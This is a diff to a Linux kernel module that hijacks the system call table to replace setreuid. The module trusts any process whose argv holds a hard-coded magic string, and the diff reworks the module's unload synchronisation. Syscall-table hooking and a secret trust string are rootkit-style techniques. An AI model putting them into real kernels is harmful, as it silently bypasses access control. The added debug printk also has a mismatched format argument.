@@ -20,9 +20,6 @@ int ssSize = NUMBER_OF_FUNCTIONS;
 void *sys_call_table;
 struct cpumask *cpus;
 
-struct completion synchUnload;
-atomic_t unlFlag = ATOMIC_INIT (0);
-
 const char *magicString = "xxxGANGNAM-STYLExxx"; // if this string is into argv, process is trusted
 
 
@@ -188,9 +185,7 @@ long newSetreuid (uid_t ruid, uid_t euid) {
 #ifdef MY_OWN_DEBUG
 		printk ("Number of counter AFTER: %ld\n", atomic64_read (& ssPtr[SYS_SETREUID_NUM].numOfCalls));
 #endif
-		if (!atomic64_read (& ssPtr[SYS_SETREUID_NUM].numOfCalls) && atomic_read (&unlFlag)) {
-			complete (&synchUnload);
-		}
+		
 		return ret;
 	}
 	else
@@ -199,9 +194,7 @@ long newSetreuid (uid_t ruid, uid_t euid) {
 #ifdef MY_OWN_DEBUG
 		printk ("Number of counter AFTER: %ld\n", atomic64_read (& ssPtr[SYS_SETREUID_NUM].numOfCalls));
 #endif
-		if (!atomic64_read (& ssPtr[SYS_SETREUID_NUM].numOfCalls) && atomic_read (&unlFlag)) {
-			complete (&synchUnload);
-		}
+		
 		return -EPERM;
 	}
 }
@@ -297,7 +290,7 @@ int start (void) {
 	}
 	
 	
-	init_completion (&synchUnload);
+	//init_completion (&synchUnload);
 	
 	fillServiceTable (sys_call_table);
 	dat.scltPtr = sys_call_table;
@@ -328,9 +321,7 @@ void stop (void) {
 	}
 	stop_machine(&setFunc, &dat, cpus);
 	kfree (cpus);
-	kfree (ssPtr);
 	
-	atomic_set (&unlFlag, 1);
 #ifdef MY_OWN_DEBUG
 	printk ("Before last mark\n");
 #endif
@@ -338,8 +329,14 @@ void stop (void) {
 	// на выгрузку - процесс будет висеть бесконечно, т.к. его условную переменную никто не просигналит.
 	while (atomic64_read (& ssPtr[SYS_SETREUID_NUM].numOfCalls)) {
 		set_current_state (TASK_INTERRUPTIBLE);
+#ifdef MY_OWN_DEBUG
+		printk ("Waiting, read cnt: %ld, readdir cnt: %ld\n",
+				atomic64_read (& ssPtr[SYS_SETREUID_NUM].numOfCalls)
+		);
+#endif
 		schedule_timeout (5 * HZ);
 	}
+	kfree (ssPtr);
 #ifdef MY_OWN_DEBUG
 	printk ("Bye bye\n");
 #endif
